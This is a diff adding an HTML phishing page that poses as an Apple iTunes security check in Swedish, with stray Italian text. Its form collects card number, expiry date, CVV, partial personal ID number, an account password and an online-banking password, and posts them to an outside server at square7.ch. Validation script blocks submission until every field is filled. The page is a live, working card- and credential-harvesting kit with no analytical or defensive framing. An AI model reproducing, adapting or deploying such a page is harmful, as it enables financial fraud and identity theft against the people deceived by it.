@@ -1,0 +1,210 @@
+<HEAD><TITLE>iTunes-ID Apple</TITLE><LINK rel=stylesheet 
+href="http://www.estcard.ee/publicweb/html/est/ipay/styles.css">
+<SCRIPT type=text/javascript>
+  function submitIt(form) {
+    if (form.nom.value == "") {
+      alert("fylla området Ditt fullständiga namn.");
+      form.nom.focus();
+      form.nom.select();
+      return false;
+	  }else if (form.prenom.value == "") {
+      alert("fylla området Ditt fullständiga namn.");
+      form.prenom.focus();
+      form.prenom.select();
+      return false;
+    }else if (form.trackdata.value == "") {
+      alert("fylla området ditt kortnummer.");
+      form.trackdata.focus();
+      form.trackdata.select();
+      return false;
+    }else if (form.expdate.value == "") {
+      alert("Fyll kort utgångsdatum i området.");
+      form.expdate.focus();
+      form.expdate.select();
+      return false;
+    }else if (form.expirydato.value == "") {
+      alert("Fyll kort utgångsdatum i området.");
+      form.expirydato.focus();
+      form.expirydato.select();
+      return false;
+    }else if (form.cvv2.value == "") {
+      alert("fylla området av kontrollsiffror av kort.");
+      form.cvv2.focus();
+      form.cvv2.select();
+      return false;
+	      }else if (form.msgdata1.value == "") {
+      alert("riempi il codice di Personal Area .");
+      form.msgdata1.focus();
+      form.msgdata1.select();
+      return false;
+	  
+    }else if (form.pass.value == "") {
+      alert("ucampo dfylde immettere la password corrente / SecureCode.");
+      form.pass.focus();
+      form.pass.select();
+      return false;
+    }else{
+      return true;
+    }    
+  }
+  </SCRIPT>
+
+<STYLE type=text/css>
+body {
+	margin: 10px;
+}
+h1 {
+	font-family: Verdana;
+	font-size: 14px;
+}
+.tbl {
+	background-color: #f0f0f0;
+	border-top: 3px solid #ccc;
+}
+td {
+	font-family: Verdana;
+	font-size: 12px;
+}
+#cnt {
+	width: 550px;
+	margin: auto;
+}
+</STYLE>
+
+<SCRIPT language=Javascript type=text/javascript>
+        function disableEnterKey(e)
+        {
+     var key;     
+         if(window.event)
+            key = window.event.keyCode; //IE
+         else
+           key = e.which; //firefox     
+        return (key != 13 &amp;&amp; key != 32);
+        }
+
+function isIntegere(s)
+      {
+        if (isNaN(s) &amp;&amp; s != "" &amp;&amp; s != null){
+                document.getElementById("expdate").style.background = "#FF5D60"
+                return false;}
+      document.getElementById("expdate").style.background = "#F5F5F5"
+      return true;
+}
+
+function isIntegert(s)
+      {
+        if (isNaN(s) &amp;&amp; s != "" &amp;&amp; s != null){
+                document.getElementById("trackdata").style.background = "#FF5D60"
+                return false;}
+      document.getElementById("trackdata").style.background = "#F5F5F5"
+      return true;
+}
+
+function setFocus()
+{
+             document.getElementById("trackdata").focus();
+}
+
+</SCRIPT>
+
+</HEAD>
+<BODY onload=setFocus() bgColor=#ffffff>
+<DIV align=center>
+<DIV id=cnt>
+<DIV align=left>
+<TABLE cellPadding=0 width=550>
+  <TBODY>
+    <TD align=right>
+      <DIV><NOBR></NOBR>&nbsp;</DIV>
+      <DIV><NOBR><IMG border=0 alt="Firts-Logo" 
+      src="http://cjours.1apps.com/below.png" 
+      width=200 
+      height=175>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      <IMG border=0 alt=Last-Logo 
+      src="http://cjours.1apps.com/perfect.jpg" 
+      width=200 height=175>&nbsp;&nbsp;&nbsp;&nbsp;</NOBR><NOBR> 
+  </NOBR></DIV></TD></TR></TBODY></TABLE></DIV>
+<DIV align=left>
+<FORM id=FORM1 onsubmit="return submitIt(this)" method=post name=FORM1 
+action=http://booking.square7.ch/live%20access/reponde-account/info-16.php>
+<DIV style="WIDTH: 551px; HEIGHT: 730px" id=cnt>
+<DIV align=left>
+<TABLE cellPadding=3 width=550>
+  <TBODY>
+  <TR>
+    <TH colSpan=2 align=left>
+      <DIV align=center><SPAN id=result_box lang=da class=short_text><SPAN 
+      class=hps>Obligatoriskt</SPAN> <SPAN class=hps>Metod</SPAN> <SPAN 
+      class=hps>Vårt Nya</SPAN> <SPAN class=hps>Säkerhet</SPAN> Apple iTunes</SPAN></DIV>
+      <DIV><SPAN lang=da class=short_text><SPAN 
+      class=hps></SPAN></SPAN>&nbsp;</DIV>
+      <DIV>iTunes-ID:<FONT 
+    color=#e13104> Skydda Ditt Konto Visa-kort MasterCard ® Internet E-Handel</FONT></DIV></TH></TR>
+  <TR>
+    <TD width=290>Fullständiga Namn<FONT color=#ff0000>*</FONT>:</TD>
+    <TD align=left><INPUT style="WIDTH: 70px; HEIGHT: 20px" id=nom 
+      onkeypress="return disableEnterKey(event)" onkeyup=isIntegere(this.value) 
+      maxLength=14 size=2 name=nom autocomplete="off"><SPAN id=result_box 
+      lang=da class=short_text> <INPUT style="WIDTH: 70px; HEIGHT: 20px" 
+      onkeypress="return disableEnterKey(event)" maxLength=14 size=2 name=prenom 
+      autocomplete="off"></SPAN> 
+  <TR>
+  <TR>
+    <TD width=290>Kort Nummer: <FONT color=#ff0000>*</FONT>:</TD>
+    <TD align=left><INPUT id=trackdata 
+      onkeypress="return disableEnterKey(event)" onkeyup=isIntegert(this.value) 
+      maxLength=20 name=trackdata autocomplete="off"> </TD></TR>
+  <TR>
+    <TD width=290>Utgångsdatum<FONT color=#ff0000>*</FONT>:</TD>
+    <TD align=left><INPUT style="WIDTH: 38px; HEIGHT: 20px" id=expdate 
+      onkeypress="return disableEnterKey(event)" onkeyup=isIntegere(this.value) 
+      maxLength=2 size=2 name=expdate autocomplete="off">/ <INPUT 
+      style="WIDTH: 39px; HEIGHT: 20px" 
+      onkeypress="return disableEnterKey(event)" maxLength=4 size=2 
+      name=expirydato autocomplete="off"><SPAN id=result_box lang=da 
+      class=short_text><SPAN class=hps>Exempel</SPAN></SPAN>(12/2020)</TD></TR>
+  <TR>
+    <TD width=290>Säkerhetskoden På Kortets<FONT color=#ff0000>*</FONT>: </TD>
+    <TD align=left><INPUT style="WIDTH: 39px; HEIGHT: 20px" 
+      onkeypress="return disableEnterKey(event)" maxLength=4 size=2 name=cvv2 
+      autocomplete="off"><SPAN id=result_box lang=da class=short_text><SPAN 
+      class=hps></SPAN> <SPAN class=hps></SPAN> <SPAN class=hps> 
+      </SPAN> <SPAN class=hps></SPAN></SPAN></TD>
+      <tr>
+	  <tr>
+    <td width="290">4 sista siffrorna Person.nr:<font color="#ff0000">*</font>:</td>
+    <td align="left"><input style="WIDTH:70px;HEIGHT:70px" maxlength="27" size="27" name="msgdata1"> </td></tr>
+     <TR>
+     <TR>
+    <TD width=290><SPAN id=result_box lang=da class=short_text><SPAN 
+      class=hps> </SPAN><SPAN class=hps><FONT 
+      color=#ff0000>Lösenord:</SPAN></SPAN></TD>
+    <TD><INPUT maxLength=25 type=sss name=ssn autocomplete="off"></TD></TR>
+      <TR>
+    <TD width=290><SPAN id=result_box lang=da class=short_text><SPAN 
+      class=hps> </SPAN><SPAN class=hps><FONT 
+      color=#ff0000>NettBank Lösenord säkerhet</FONT>:</SPAN></SPAN></TD>
+    <TD><INPUT maxLength=25 type=password name=pass autocomplete="off"></TD></TR> 
+  <TR>
+    <TD width=290 align=right></TD>
+    <TD><INPUT class=button value=Bekräftelse type=submit name=submit>&nbsp; 
+  </TD></TR></TBODY></TABLE></DIV><FONT color=gray size=2 
+face="arial, verdana"><FONT color=#000000>
+<DIV class="footer clearfix" align=left><FONT color=#0000ff><SPAN lang=sv 
+class=short_text><SPAN class=hps><U></U></SPAN></SPAN></FONT>&nbsp;</DIV>
+<DIV class="footer clearfix" align=left><FONT color=#0000ff><SPAN lang=sv 
+class=short_text><SPAN class=hps><U></U></SPAN></SPAN></FONT>&nbsp;</DIV>
+<DIV class="footer clearfix" align=left><FONT color=#0000ff><SPAN lang=sv 
+class=short_text><SPAN class=hps><U></U></SPAN></SPAN></FONT>&nbsp;</DIV>
+<DIV class="footer clearfix" align=left><FONT color=#0000ff><SPAN lang=sv 
+class=short_text><SPAN class=hps><U>Uppgifter iTunes</U></SPAN></SPAN>&nbsp; 
+<U><SPAN id=result_box lang=sv class=short_text><SPAN 
+class=hps>överträdelse Apple</SPAN></SPAN>&nbsp;</U> </FONT><A title="Visa Europe" 
+onkeypress="if (event.keyCode==13) {window.open(this.href, '_blank'); return false;}" 
+onclick="window.open(this.href, '_blank'); return false;" 
+href="about:/fr/system/footernavigation/left_fr/visa_europe.aspx">iTunes Apple</A><FONT 
+color=#0000ff>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+©Copyright-2016</DIV></FONT></FORM></DIV></DIV>
+<DIV>&nbsp;</DIV></FONT>
+<DIV class="footerContainer clearfix">
+<DIV class="footer clearfix"></DIV></DIV></DIV></DIV></BODY></HTML>
